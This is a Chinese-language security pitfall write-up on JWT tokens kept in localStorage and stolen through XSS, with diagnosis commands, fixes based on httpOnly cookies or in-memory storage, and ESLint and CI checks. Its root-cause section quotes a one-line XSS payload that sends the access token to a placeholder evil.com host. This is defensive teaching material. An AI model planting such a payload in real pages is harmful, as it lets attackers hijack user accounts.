# pit-068: JWT Token 泄露 — localStorage 存储导致 XSS 窃取

## 环境
- SPA 应用（React/Vue/Svelte）
- 使用 JWT 作身份认证
- Token 存储在 `localStorage` 或 `sessionStorage`

## 症状
用户反馈账号被盗——有人用他们的身份下单/修改设置/查看私密数据。安全审计发现攻击者通过注入的恶意脚本读取了 `localStorage.getItem('access_token')`，并将 JWT 外传到攻击者服务器。使用该 token 伪装用户调用后端 API。

与 Cookie-based Token 的 httpOnly 模式相反，存储在 localStorage 中的 Token 对任何 XSS 漏洞完全暴露。

## 根因
JWT Token 的常见前端存储模式是将 token 保存在 `localStorage`：
```typescript
localStorage.setItem('access_token', token);
```
然后在每次请求中读取后放在 `Authorization` 头中：
```typescript
fetch('/api/me', {
  headers: { Authorization: `Bearer ${localStorage.getItem('access_token')}` }
});
```

这种模式的致命缺陷：**任何 XSS 漏洞（哪怕只有一次）都可窃取所有用户的 Token**。攻击者注入的恶意脚本只需一行代码：
```javascript
new Image().src = 'https://evil.com/steal?t=' + localStorage.getItem('access_token');
```

攻击面包括：
- stored/reflected/DOM-based XSS
- 嵌入的第三方 npm 包中的恶意代码
- 浏览器扩展程序的恶意行为
- CDN 脚本篡改（参见 pit-067）

## 诊断方法

```bash
# 1. 搜索项目中所有 localStorage/sessionStorage 存取 Token 的代码
grep -rn "localStorage.*token\|sessionStorage.*token\|localStorage.*access\|sessionStorage.*access" src/
grep -rn "localStorage.getItem.*token\|localStorage.getItem.*auth" src/
grep -rn "setItem.*token\|setItem.*auth\|setItem.*jwt" src/

# 2. 检查 Token 在内存中的存储位置
# 浏览器 DevTools → Application → Local Storage / Session Storage
# 查看是否有明文 Token 存在

# 3. 检查 Authorization 头的构建方式
grep -rn "Authorization.*Bearer\|Bearer.*localStorage\|Bearer.*getItem" src/

# 4. 审查是否有 httpOnly Cookie 的替代方案
grep -rn "HttpOnly\|httpOnly\|withCredentials\|credentials.*include" src/

# 5. XSS 漏洞扫描（另见 pit-064）
grep -rn "dangerouslySetInnerHTML\|v-html\|{@html\|innerHTML\|document.write" src/

# 6. 检查是否有 CSP Trusted Types
curl -sI https://yourapp.com | grep -i 'require-trusted-types-for'
# 如果没有 → 即使 XSS 漏洞修复了，未来新增 XSS 仍可窃取 localStorage
```

## 修复

```diff
// ❌ 问题代码：Token 存 localStorage，暴露给任何 XSS
- const token = localStorage.getItem('access_token');
- fetch('/api/me', {
-   headers: { Authorization: `Bearer ${token}` }
- });

// ═══════ 方案A：httpOnly Cookie（推荐） ═══════
// 后端设置 Cookie
+ // Set-Cookie: access_token=xxx; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=900
+ // 前端请求时自动携带（无需手动添加 Authorization）
+ fetch('/api/me', {
+   credentials: 'include',  // 携带 Cookie
+ });
// ✅ Token 对 JavaScript 完全不可见

// ═══════ 方案B：内存存储 + Refresh Token in httpOnly Cookie ═══════
// （页面刷新时用 refresh token 换取新 access token）
+ class TokenService {
+   private static token: string | null = null;
+
+   static setToken(t: string) { this.token = t; }
+   static getToken(): string | null { return this.token; }
+
+   static async refreshToken(): Promise<string> {
+     const res = await fetch('/api/refresh', {
+       method: 'POST',
+       credentials: 'include', // 携带 httpOnly refresh_token cookie
+     });
+     const { accessToken } = await res.json();
+     this.token = accessToken;
+     return accessToken;
+   }
+
+   static async getOrRefreshToken(): Promise<string> {
+     if (this.token) return this.token;
+     return this.refreshToken();
+   }
+ }

+ // 使用
+ const token = await TokenService.getOrRefreshToken();
+ fetch('/api/me', {
+   headers: { Authorization: `Bearer ${token}` }
+ });

// ═══════ 方案C：Service Worker Token 隔离 ═══════
// Token 存储在 Service Worker scope 内，主线程通过 postMessage 获取
+ // sw.js
+ let token: string | null = null;
+ self.addEventListener('message', (e) => {
+   if (e.data.type === 'SET_TOKEN') token = e.data.token;
+   if (e.data.type === 'GET_TOKEN') e.ports[0].postMessage({ token });
+ });
+ // 主线程通过 MessageChannel 与 SW 通信
+ // 注意：SW 也需要处理 fetch 事件的 Authorization 注入，增加复杂度

// ═══════ 修复后的 Authorization 拦截器 ═══════
+ // fetch 拦截器: 自动注入 token
+ const originalFetch = window.fetch;
+ window.fetch = async function(input, init = {}) {
+   const token = TokenService.getToken();
+   if (token) {
+     init.headers = {
+       ...init.headers,
+       Authorization: `Bearer ${token}`,
+     };
+   }
+   return originalFetch(input, init);
+ };
```

## 原理
JavaScript 对浏览器存储的访问权限：
- `localStorage` / `sessionStorage`：任何同源的 JavaScript 都可以读写。**不安全**。
- `document.cookie`（非 httpOnly）：任何同源的 JavaScript 都可以读写。**不安全**。
- `document.cookie`（httpOnly）：JavaScript 完全不可读。**安全**。
- 内存变量（闭包/模块作用域）：只有该 JS 模块可以访问。**安全但页面刷新丢失**。

httpOnly Cookie 的安全模型：Cookie 由服务端通过 `Set-Cookie` 响应头设置，浏览器存储它，在每个匹配的 HTTP 请求中自动附加，但 JavaScript 代码无法通过 `document.cookie` 读取或修改它。这意味着即使攻击者成功注入 XSS 脚本，也无法窃取 httpOnly Cookie 中的 Token。

httpOnly Cookie 的 CSRF 风险可通过 `SameSite=Strict/Lax` + CSRF Token 缓解。对于 SPA 调用 API，`SameSite=Lax` 通常足够（同一站点内的 API 请求会自动携带 Cookie），跨站伪造的 POST 请求则不会携带。

## 架构视角 (Architecture Perspective)

### 架构层面根因
Token 泄露的表面原因是"存错位置"，架构根因是**认证信息的安全边界与 Web 平台的信任模型不匹配**：
- **localStorage 的"同源"安全性被高估**：同源策略阻止了跨域读取 localStorage，但对同源的 XSS 注入完全透明——而 XSS 恰恰发生在同源内。
- **认证层与 XSS 防御层耦合**：将 Token 存储在 localStorage 意味着认证安全完全依赖 XSS 防御。但 XSS 防御是多层体系（输入验证、输出转义、CSP、Trusted Types），任何一层的疏忽都会导致认证崩溃。
- **缺少纵深防御 (Defense in Depth)**：没有在"假设 XSS 已经发生"的前提下设计 Token 存储。纵深防御要求即使攻击者成功注入脚本，仍应无法窃取最敏感的凭据。

### 系统级预防策略

**静态防护**：
```js
// ESLint 规则：禁止在 localStorage 中存取 token/jwt/auth 相关键
rules: {
  'no-restricted-syntax': ['error', {
    selector: 'CallExpression[callee.property.name=/setItem|getItem/] > Literal[value=/token|auth|jwt/i]',
    message: '禁止在 localStorage 中存储 Token，请使用 httpOnly Cookie 或内存存储'
  }],
  // 也禁止作为变量名
  'no-restricted-properties': ['error', {
    object: 'localStorage',
    message: '请使用 AuthService 替代直接操作 localStorage 做认证'
  }]
}
```

**CI 防护**：
```yaml
# CI 中静态分析 Token 存储位置
- name: Check Token Storage
  run: |
    # 检测 localStorage token 存储
    if grep -rq "localStorage.*token\|localStorage.*auth\|localStorage.*jwt" src/; then
      echo "❌ 不允许在 localStorage 存储 JWT"
      exit 1
    fi
```

**架构防护**：
- **AuthService 抽象层**：所有认证逻辑通过 `AuthService` 单例，禁止组件直接操作存储。AuthService 内部强制使用 httpOnly Cookie 或内存存储。
- **Token 生命周期管理**：access token 短期有效（15 分钟），refresh token 仅存 httpOnly Cookie，降低泄露影响。
- **多因素纵深防御**：即使 Token 被窃取，配合 IP/User-Agent/HMAC 绑定也能检测异常使用。

**流程防护**：
- 安全 Code Review 清单："Token 存储在何处？是否对 XSS 暴露？"
- 定期渗透测试：尝试 XSS → 窃取 Token → 调用 API，验证防御有效性。
- 登录异常检测：异地 IP 登录、频繁刷新 Token 等异常模式触发告警。

### 跨层影响链

```
上游影响:
  - 一次 XSS 漏洞 → 所有用户的 Token 可被批量窃取
  - Token 被泄露后，攻击者可以伪装任何用户 → 数据泄露/资金损失

下游影响:
  - 攻击者批量遍历 API → 拖取整个数据库
  - 管理员账号被接管 → 系统完全沦陷
  - 用户隐私数据泄露 → GDPR 罚款 + 法律诉讼

合规影响:
  - 身份认证缺陷 → SOC2 / ISO 27001 审计失败
  - 数据泄露通知义务 → 72 小时内通知监管机构
  - 可能的刑事追责（取决于法域）
```

## 预防

1. **Token 存储到 httpOnly Cookie**：`Set-Cookie: access_token=xxx; HttpOnly; Secure; SameSite=Strict`。
2. **access token 短期化**：15 分钟有效期，降低泄露窗口。
3. **refresh token 仅放 httpOnly Cookie**：不与 JavaScript 共享。
4. **禁止 localStorage 存 Token**：ESLint 规则 + CI 扫描双重保障。
5. **CSP + Trusted Types** 降低 XSS 风险：即使 Token 存储有遗漏，XSS 也难以成功。

## 回退

```bash
# 如果从 localStorage 迁移到 httpOnly Cookie 出现问题：
# 方案A：短期内同时支持两种方式（过渡期）
# 读取顺序：先检查 httpOnly Cookie 是否存在（通过 /api/whoami）、
# 再回退到 localStorage（用于未迁移的设备）
# 逐步升级客户端，全部升级后废弃 localStorage 分支

# 方案B：若 Cookie 的 SameSite=Strict 导致跨站跳转断连
# 降低为 SameSite=Lax（跨站 GET 请求携带 Cookie，POST 不携带）
# 或将 auth 接口和 API 分离：

# 方案C：若第三方域名无法收到 httpOnly Cookie（跨域 API）
# 保持 access token 在内存中 + refresh token 存 httpOnly Cookie
# 刷新时通过同源代理转发 /api/refresh

# 方案D：回退到内存存储（方案B）但加强 XSS 防御
# 在迁移期间，先部署 CSP strict-dynamic + Trusted Types
```
